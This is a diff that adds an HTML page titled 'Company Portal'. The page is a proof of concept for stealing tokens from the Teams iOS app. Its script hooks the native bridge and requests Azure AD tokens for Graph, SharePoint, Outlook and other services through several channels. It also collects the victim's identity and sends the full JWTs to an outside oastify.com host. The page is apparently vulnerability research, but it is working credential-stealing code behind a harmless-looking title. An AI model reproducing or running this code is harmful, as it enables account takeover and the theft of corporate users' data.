@@ -1,0 +1,408 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Company Portal</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{font:11px/1.4 'SF Mono',monospace;background:#0d1117;color:#c9d1d9;padding:8px}
+#log{background:#161b22;padding:8px;border-radius:6px;white-space:pre-wrap;word-break:break-all;max-height:80vh;overflow-y:auto}
+.ok{color:#3fb950}.fail{color:#f85149}.warn{color:#d29922}.crit{color:#f0883e;font-weight:bold}.token{color:#ff7b72;font-weight:bold}
+.hdr{color:#58a6ff;font-weight:bold;font-size:12px;margin:8px 0 4px;display:block}
+.jwt{background:#21262d;padding:6px;border-radius:4px;margin:4px 0;border-left:3px solid #f0883e}
+</style>
+</head>
+<body>
+<div id="log"></div>
+
+<script>
+(function() {
+
+var OAST = 'sa627ycymy0gdz7gyqo2epmwenke86wv.oastify.com';
+
+var el = document.getElementById('log');
+var NI = window.nativeInterface;
+var pendingRequests = {};
+var msgId = 5000;
+var tokensFound = [];
+
+function log(msg, cls) {
+    var s = document.createElement('span');
+    if (cls) s.className = cls;
+    s.textContent = msg + '\n';
+    el.appendChild(s);
+    el.scrollTop = el.scrollHeight;
+}
+
+function exfil(tag, data) {
+    var d = typeof data === 'string' ? data : JSON.stringify(data);
+    var url = 'https://' + OAST + '/' + tag + '?d=' + encodeURIComponent(d.substring(0, 2500)) + '&ts=' + Date.now();
+    fetch(url, { mode: 'no-cors' }).catch(function() {
+        new Image().src = url;
+    });
+}
+
+function decodeJwt(token) {
+    try {
+        var parts = token.split('.');
+        if (parts.length !== 3) return null;
+        var b64 = parts[1].replace(/-/g, '+').replace(/_/g, '/');
+        while (b64.length % 4) b64 += '=';
+        return JSON.parse(atob(b64));
+    } catch(e) { return null; }
+}
+
+function displayToken(label, token) {
+    var claims = decodeJwt(token);
+    if (!claims) {
+        log('  [' + label + '] Got value but not a valid JWT', 'warn');
+        return;
+    }
+
+    tokensFound.push({ label: label, token: token, claims: claims });
+
+    log('', '');
+    log('TOKEN CAPTURED: ' + label, 'token');
+
+    var info = document.createElement('div');
+    info.className = 'jwt';
+    info.textContent =
+        'aud: ' + (claims.aud || 'N/A') + '\n' +
+        'scp: ' + (claims.scp || 'N/A') + '\n' +
+        'roles: ' + (claims.roles ? claims.roles.join(', ') : 'N/A') + '\n' +
+        'upn: ' + (claims.upn || claims.unique_name || claims.preferred_username || 'N/A') + '\n' +
+        'tid: ' + (claims.tid || 'N/A') + '\n' +
+        'oid: ' + (claims.oid || 'N/A') + '\n' +
+        'appid: ' + (claims.appid || claims.azp || 'N/A') + '\n' +
+        'exp: ' + (claims.exp ? new Date(claims.exp * 1000).toISOString() : 'N/A') + '\n' +
+        'iss: ' + (claims.iss || 'N/A');
+    el.appendChild(info);
+
+    exfil('TOKEN-' + label, {
+        token_preview: token.substring(0, 50) + '...' + token.substring(token.length - 20),
+        aud: claims.aud,
+        scp: claims.scp,
+        upn: claims.upn || claims.unique_name,
+        tid: claims.tid,
+        oid: claims.oid,
+        appid: claims.appid || claims.azp,
+        exp: claims.exp
+    });
+
+    exfil('FULL-JWT-' + label, token);
+}
+
+function extractTokens(data) {
+    var str = typeof data === 'string' ? data : JSON.stringify(data);
+    var re = /eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g;
+    var match;
+    var found = [];
+    while ((match = re.exec(str)) !== null) {
+        found.push(match[0]);
+    }
+    return found;
+}
+
+// ================================================================
+// RESPONSE HANDLER — captures all native responses
+// ================================================================
+function installResponseHandler() {
+    var origOnNM = window.onNativeMessage;
+    window.onNativeMessage = function(evt) {
+        var data = evt && evt.data ? evt.data : evt;
+        var id = data ? data.id : '?';
+        var argsStr = JSON.stringify(data.args || []);
+
+        // Check pending requests
+        var req = pendingRequests[id];
+        if (req) {
+            log('[RESPONSE id=' + id + '] for: ' + req.label, 'ok');
+            delete pendingRequests[id];
+        } else {
+            log('[RESPONSE id=' + id + '] (unsolicited)', 'warn');
+        }
+
+        // Check for tokens
+        var tokens = extractTokens(argsStr);
+        if (tokens.length > 0) {
+            tokens.forEach(function(t) {
+                displayToken(req ? req.label : 'unsolicited-' + id, t);
+            });
+        } else {
+            // Log the response content for debugging
+            var preview = argsStr.substring(0, 300);
+            if (preview.indexOf('error') !== -1 || preview.indexOf('Error') !== -1) {
+                log('  Error: ' + preview, 'fail');
+            } else {
+                log('  Response: ' + preview, 'warn');
+            }
+            exfil('resp-' + id, { label: req ? req.label : 'unknown', data: argsStr.substring(0, 1500) });
+        }
+
+        if (origOnNM) return origOnNM.call(window, evt);
+    };
+
+    // Also hook handleResponseFromNative for raw responses
+    if (NI && NI.handleResponseFromNative) {
+        var origHRFN = NI.handleResponseFromNative;
+        NI.handleResponseFromNative = function(response, requestId) {
+            var tokens = extractTokens(response);
+            if (tokens.length > 0) {
+                log('[RAW RESPONSE id=' + requestId + '] contains JWT!', 'token');
+                tokens.forEach(function(t) {
+                    var req = pendingRequests[requestId];
+                    displayToken(req ? req.label + '-raw' : 'raw-' + requestId, t);
+                });
+            }
+            return origHRFN.call(NI, response, requestId);
+        };
+    }
+}
+
+// ================================================================
+// REQUEST HELPERS
+// ================================================================
+function sendNI(func, args, label) {
+    var id = msgId++;
+    pendingRequests[id] = { label: label, func: func, sent: Date.now() };
+    NI.framelessPostMessage(JSON.stringify({
+        func: func,
+        id: id,
+        args: args || [],
+        timestamp: Date.now(),
+        apiVersionTag: 'v2_' + func
+    }));
+    log('  [' + label + '] sent (id=' + id + ')', 'ok');
+    return id;
+}
+
+// ================================================================
+// MAIN FLOW
+// ================================================================
+
+log('=== Teams iOS Token Theft PoC ===', 'hdr');
+log('Purpose: prove attacker tab can obtain AAD tokens via native bridge', 'warn');
+log('Date: ' + new Date().toISOString(), '');
+log('Page URL: ' + window.location.href, '');
+log('');
+
+// Step 0: Environment check
+log('STEP 0: Environment Check', 'hdr');
+log('nativeInterface: ' + (NI ? 'YES (' + Object.getOwnPropertyNames(NI).length + ' props)' : 'NO'), NI ? 'ok' : 'fail');
+log('framelessPostMessage: ' + (NI && NI.framelessPostMessage ? 'YES' : 'NO'), NI && NI.framelessPostMessage ? 'ok' : 'fail');
+log('webkit.messageHandlers.listener: ' + !!(window.webkit && window.webkit.messageHandlers && window.webkit.messageHandlers.listener), '');
+log('nestedAppAuthBridge: ' + !!window.nestedAppAuthBridge, '');
+log('userAgent: ' + navigator.userAgent.substring(0, 120), '');
+
+exfil('env', {
+    ni: !!NI,
+    niProps: NI ? Object.getOwnPropertyNames(NI).length : 0,
+    fpm: !!(NI && NI.framelessPostMessage),
+    ua: navigator.userAgent.substring(0, 200),
+    url: window.location.href
+});
+
+if (!NI || !NI.framelessPostMessage) {
+    log('\nNATIVE BRIDGE NOT AVAILABLE — this PoC requires Teams iOS mobile.', 'fail');
+    log('On web/desktop, the tab opens in external browser (no bridge access).', 'warn');
+    log('This difference is the core of the vulnerability.', 'warn');
+    return;
+}
+
+// Install response handler BEFORE sending any requests
+installResponseHandler();
+
+// Step 1: SDK init + context (proves we're inside Teams)
+log('\nSTEP 1: SDK Init + User Identity', 'hdr');
+
+var sdkScript = document.createElement('script');
+sdkScript.src = 'https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js';
+sdkScript.onload = function() {
+    microsoftTeams.app.initialize().then(function() {
+        return microsoftTeams.app.getContext();
+    }).then(function(ctx) {
+        var upn = ctx.user ? ctx.user.userPrincipalName : 'N/A';
+        var tenantId = ctx.user && ctx.user.tenant ? ctx.user.tenant.id : 'N/A';
+        var userId = ctx.user ? ctx.user.id : 'N/A';
+        var host = ctx.app && ctx.app.host ? ctx.app.host.clientType : 'N/A';
+        var teamName = ctx.team ? ctx.team.displayName : 'N/A';
+        var channelName = ctx.channel ? ctx.channel.displayName : 'N/A';
+
+        log('VICTIM IDENTITY (from attacker-controlled page):', 'token');
+        log('  UPN:       ' + upn, 'crit');
+        log('  Tenant ID: ' + tenantId, 'crit');
+        log('  User ID:   ' + userId, 'crit');
+        log('  Host:      ' + host, 'crit');
+        log('  Team:      ' + teamName, '');
+        log('  Channel:   ' + channelName, '');
+
+        exfil('VICTIM-IDENTITY', {
+            upn: upn,
+            tenantId: tenantId,
+            userId: userId,
+            host: host,
+            team: teamName,
+            channel: channelName
+        });
+
+        // Step 2: Token theft attempts
+        runTokenTheft();
+
+    }).catch(function(e) {
+        log('SDK init error: ' + e.message, 'fail');
+        log('Trying direct NI approach without SDK...', 'warn');
+        runTokenTheft();
+    });
+};
+document.head.appendChild(sdkScript);
+
+function runTokenTheft() {
+
+    // ================================================================
+    // STEP 2: getAuthToken via SDK (official API)
+    // ================================================================
+    log('\nSTEP 2: getAuthToken via Teams SDK', 'hdr');
+    log('This uses the official microsoftTeams.authentication.getAuthToken()', '');
+
+    try {
+        microsoftTeams.authentication.getAuthToken().then(function(token) {
+            log('SDK getAuthToken returned a token!', 'token');
+            displayToken('SDK-default', token);
+        }).catch(function(e) {
+            log('  SDK default: ' + (e.message || e), 'fail');
+            exfil('sdk-default-err', String(e.message || e));
+        });
+    } catch(e) {
+        log('  SDK error: ' + e.message, 'fail');
+    }
+
+    try {
+        microsoftTeams.authentication.getAuthToken({ silent: true }).then(function(token) {
+            log('SDK getAuthToken (silent) returned a token!', 'token');
+            displayToken('SDK-silent', token);
+        }).catch(function(e) {
+            log('  SDK silent: ' + (e.message || e), 'fail');
+        });
+    } catch(e) {}
+
+    try {
+        microsoftTeams.authentication.getAuthToken({
+            resources: ['https://graph.microsoft.com/.default']
+        }).then(function(token) {
+            log('SDK getAuthToken (Graph resource) returned a token!', 'token');
+            displayToken('SDK-graph-resource', token);
+        }).catch(function(e) {
+            log('  SDK graph resource: ' + (e.message || e), 'fail');
+        });
+    } catch(e) {}
+
+    // ================================================================
+    // STEP 3: getAuthToken via NI.framelessPostMessage (bypass SDK validation)
+    // ================================================================
+    log('\nSTEP 3: getAuthToken via NI.framelessPostMessage (direct native bridge)', 'hdr');
+    log('Bypasses SDK-level origin checks — goes straight to native iOS host', '');
+
+    var resources = [
+        ['NI-empty-resource', ''],
+        ['NI-graph', 'https://graph.microsoft.com'],
+        ['NI-sharepoint', 'https://*.sharepoint.com'],
+        ['NI-outlook', 'https://outlook.office.com'],
+        ['NI-skype', 'https://api.spaces.skype.com'],
+        ['NI-teams-chat', 'https://chatsvcagg.teams.microsoft.com'],
+        ['NI-substrate', 'https://substrate.office.com']
+    ];
+
+    resources.forEach(function(r, i) {
+        setTimeout(function() {
+            sendNI('authentication.getAuthToken', [[r[1]]], r[0]);
+        }, i * 300);
+    });
+
+    // Also try with claims parameter
+    setTimeout(function() {
+        sendNI('authentication.getAuthToken',
+            [['https://graph.microsoft.com', '{"access_token":{"xms_cc":{"values":["cp1"]}}}']],
+            'NI-graph-with-claims');
+    }, resources.length * 300 + 300);
+
+    // ================================================================
+    // STEP 4: Nested App Auth Bridge (if available)
+    // ================================================================
+    setTimeout(function() {
+        log('\nSTEP 4: Nested App Auth Bridge', 'hdr');
+
+        var NAA = window.nestedAppAuthBridge;
+        if (!NAA) {
+            log('nestedAppAuthBridge not available in this context', 'warn');
+            return;
+        }
+
+        log('NAA bridge available!', 'ok');
+
+        NAA.addEventListener('message', function(resp) {
+            log('[NAA RESPONSE] ' + JSON.stringify(resp).substring(0, 500), 'crit');
+            var tokens = extractTokens(resp);
+            tokens.forEach(function(t) { displayToken('NAA-response', t); });
+            exfil('naa-response', resp);
+        });
+
+        NAA.postMessage(JSON.stringify({
+            messageType: 'NestedAppAuthRequest',
+            method: 'GetToken',
+            requestId: 'theft-' + Date.now(),
+            clientId: '1fec8e78-bce4-4aaf-ab1b-5451cc387264',
+            scope: 'https://graph.microsoft.com/.default',
+            correlationId: 'theft-corr-' + Date.now()
+        }));
+        log('  NAA GetToken request sent', 'ok');
+
+    }, resources.length * 300 + 1000);
+
+    // ================================================================
+    // STEP 5: Summary after all requests complete
+    // ================================================================
+    setTimeout(function() {
+        log('\n' + '='.repeat(50), 'hdr');
+        log('RESULTS SUMMARY', 'hdr');
+        log('='.repeat(50), 'hdr');
+
+        if (tokensFound.length === 0) {
+            log('No tokens captured.', 'fail');
+            log('Check OAST for response data — tokens may have been', 'warn');
+            log('returned in a format not matching JWT pattern.', 'warn');
+
+            // Show all pending (unanswered) requests
+            var pending = Object.keys(pendingRequests);
+            if (pending.length > 0) {
+                log('\nPending requests (no response received):', 'warn');
+                pending.forEach(function(id) {
+                    log('  id=' + id + ' ' + pendingRequests[id].label, 'warn');
+                });
+            }
+        } else {
+            log(tokensFound.length + ' TOKEN(S) CAPTURED:', 'token');
+            tokensFound.forEach(function(t, i) {
+                log('  [' + (i+1) + '] ' + t.label + ' → aud=' + t.claims.aud + ' scp=' + (t.claims.scp || 'N/A'), 'crit');
+            });
+
+            exfil('SUMMARY', {
+                count: tokensFound.length,
+                tokens: tokensFound.map(function(t) {
+                    return { label: t.label, aud: t.claims.aud, scp: t.claims.scp, upn: t.claims.upn };
+                })
+            });
+
+            log('\nIMPACT: Attacker-controlled page inside Teams iOS tab', 'token');
+            log('obtained valid AAD tokens WITHOUT user interaction.', 'token');
+            log('These tokens bypass MFA (session already authenticated).', 'token');
+        }
+
+        log('\nAll requests complete. Check OAST for full data.', '');
+    }, resources.length * 300 + 5000);
+}
+
+})();
+</script>
+</body>
+</html>
